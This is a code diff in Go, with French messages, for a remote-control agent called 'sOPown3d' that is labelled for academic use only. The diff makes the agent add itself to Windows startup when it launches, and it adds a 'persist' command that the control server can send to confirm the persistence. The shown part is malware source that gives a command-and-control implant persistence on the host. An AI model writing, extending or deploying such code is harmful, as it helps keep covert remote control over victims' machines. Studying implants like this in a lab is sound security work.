@@ -10,12 +10,15 @@ import (
 	"runtime"
 	"time"
 
+	"sOPown3d/agent/persistence"
 	"sOPown3d/shared"
 )
 
 func main() {
 	fmt.Println("=== Agent sOPown3d - Version Commandes ===")
 	fmt.Println("Usage académique uniquement")
+
+	setupPersistence()
 
 	serverURL := "http://127.0.0.1:8080"
 	agentID := generateID()
@@ -51,6 +54,28 @@ func main() {
 func generateID() string {
 	hostname, _ := os.Hostname()
 	return fmt.Sprintf("%s-%d", hostname, time.Now().Unix())
+}
+
+// Setup persistance au démarrage
+func setupPersistence() {
+	fmt.Println("\n[Persistance] Configuration...")
+
+	exePath, err := os.Executable()
+	if err != nil {
+		fmt.Println("  ✗ Erreur chemin:", err)
+		return
+	}
+
+	if persistent, path := persistence.CheckStartup(); persistent {
+		fmt.Printf("  ✓ Déjà persistant\n  Chemin: %s\n", path)
+	} else {
+		fmt.Println("  ➔ Ajout au démarrage Windows...")
+		if err := persistence.AddToStartup(exePath); err != nil {
+			fmt.Printf("  ✗ Échec: %v\n", err)
+		} else {
+			fmt.Println("  ✓ Persistance activée")
+		}
+	}
 }
 
 // Récupérer infos
@@ -111,6 +136,14 @@ func executeCommand(cmd *shared.Command) {
 
 	case "ping":
 		fmt.Println("Pong!")
+
+	case "persist":
+		fmt.Println("📋 Vérification persistance...")
+		if persistent, path := persistence.CheckStartup(); persistent {
+			fmt.Printf("  ✓ Persistant\n  Chemin: %s\n", path)
+		} else {
+			fmt.Println("  ✗ Non persistant")
+		}
 
 	default:
 		fmt.Printf("Commande inconnue: %s\n", cmd.Action)
